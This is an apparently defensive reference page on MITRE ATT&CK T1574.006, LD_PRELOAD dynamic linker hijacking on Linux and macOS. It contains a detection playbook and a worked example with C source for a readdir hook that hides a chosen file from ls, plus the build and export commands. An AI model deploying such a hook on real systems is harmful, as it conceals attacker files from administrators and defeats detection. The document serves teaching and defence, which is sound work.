# Hijack Execution Flow: Dynamic Linker Hijacking T1574.006
## Execution flow hijacking playbook
1. Use `env | grep LD_PRELOAD` to check if LD_PRELOAD it is set. If it is - check specified path for malicious files.
2. Check `/etc/ld.so.preload` for malicious entries.
3. If you are certain that a binary was injected with a malicious function use `ldd <binary>` to list all used shared libraries.
4. Analyze malicious files for potential artifacts.
5. Remove malicious files.

## MITRE ATT&CK
Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as `LD_PRELOAD` on Linux or `DYLD_INSERT_LIBRARIES` on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.

On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the `export` command, `setenv` function, or `putenv` function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such as Python’s `os.environ`.

On Linux, adversaries may set `LD_PRELOAD` to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. `LD_PRELOAD` can be set via the environment variable or `/etc/ld.so.preload` file.Libraries specified by `LD_PRELOAD` are loaded and mapped into memory by `dlopen()` and `mmap()` respectively.

On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the `DYLD_INSERT_LIBRARIES` environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.

## General
### What Are Shared Libraries?
Shared libraries are pre-compiled C-code that are linked during the final steps of producing an executable. They provide reusable features like functions, routines, classes, data structures, etc., which can then be used while writing your own code.
### Common Shared Libraries which  Linux Contains are :
-   **libc** : The standard C library.
-   **glibc** : GNU Implementation of standard **libc**.
-   **libcurl** : Multiprotocol file transfer library.
-   **libcrypt** : C Library to facilitate encryption, hashing, encoding etc.

The important thing to know about shared libraries is that they contain the addresses of various functions required by programs during runtime. 
For example, when a dynamically linked executable issues a `read()` syscall, the system looks up the address of `read()` from the **libc** shared library. Now, **libc** has a well-defined definition for `read()`, which specifies the number and type of function parameters and expects a particular type of data in return. Usually, the system knows where to find these functions, but we can control where the system looks and the adversaries can leverage it for malicious activities.

### Example: hiding files from ls
The primary thing which we need to know here that the `ls` command uses a function called `readdir()` which returns a pointer to the next `dirent` structure in the directory. A `dirent` is a C - structure who's **glibc** definition can be obtained from the man page of **readdir**:
```
struct dirent {  
 ino_t          d_ino;       /* Inode number */  
 off_t          d_off;       /* Not an offset; see below */  
 unsigned short d_reclen;    /* Length of this record */  
 unsigned char  d_type;      /* Type of file; not supported not supported by all filesystem types */   
 char           d_name[256]; /* Null-terminated filename */  
 };
```

The main parameter which we are concerned about here is the `d_name[256]` which is a mandatory field and contains the name of the various files in our a directory.

So here's the roadmap:
-   `ls` uses `readdir()` function to get the contents of a directory
-   The `readdir()` function returns a pointer to a `dirent` structure to the next directory entry
-   The `dirent` structure contains a `d_name` parameter which contains the name of the file
-   Thus, we hook the `readdir()` function
-   Then we pass the parameters to the original function and check whether the `d_name` parameter of the `dirent` whose pointer is being returned is equal to a given a filename
-   If yes, we skip it and pass on the rest.

Our malicious readdir implementation:
```
#include <string.h>  
#include <stdlib.h>  
#include <dirent.h>  
#include <dlfcn.h>  
  
#define FILENAME "commandcontrol.json"  
  
struct dirent *readdir(DIR *dirp)  
{  
 struct dirent *(*old_readdir)(DIR *dir);   
 old_readdir = dlsym(RTLD_NEXT, "readdir");  
 struct dirent *dir;  
 while (dir = old_readdir(dirp))  
 {  
 if(strstr(dir->d_name,FILENAME) == 0) break;   
 }  
 return dir;  
}  
  
struct dirent64 *readdir64(DIR *dirp)  
{  
 struct dirent64 *(*old_readdir64)(DIR *dir);   
 old_readdir64 = dlsym(RTLD_NEXT, "readdir64");  
 struct dirent64 *dir;  
 while (dir = old_readdir64(dirp))  
 {  
 if(strstr(dir->d_name,FILENAME) == 0) break;  
 }  
 return dir;  
}
```

Breaking down our hook, we have:
-   First we declare our usual headers with the extra `#include <dirent.h>` header which contains the definition of the `dirent` structure
-   Then, we do our usual hooking stuff: creating a function with the same definition and return type, create a function pointer and use `dlsym` to store the value of the original function in it.
-   Finally coming to the most crucial part, we create a while loop and fetch the pointer to the next `dirent` structure in the directory stream pointed to by `dirp` and check if the `d_name` parameter contains our string. If it doesn't (which is denoted by an output **0** as a result of the `strstr` function), we simply break from the loop and return the value as obtained from the original function. However, if we have a match, we iterate one more time, thereby effectively skipping over our file a return pointer to the **dirent** structure pertaining to the next file in the directory.

Now all we have to do is compile the file like so:
`gcc malicious.c -fPIC -shared -D_GNU_SOURCE -o hidefile.so -ldl`
And then export it to LD_PRELOAD: `export LD_PRELOAD=./hidefile.so`

### Useful notes
Libraries in `LD_PRELOAD` are loaded before the ones listed in `/etc/ld.so.preload`.
LD_PRELOAD cannot be used with SUID binaries.
`man ld.so` holds all the information on other environment variables that affect dynamic linker.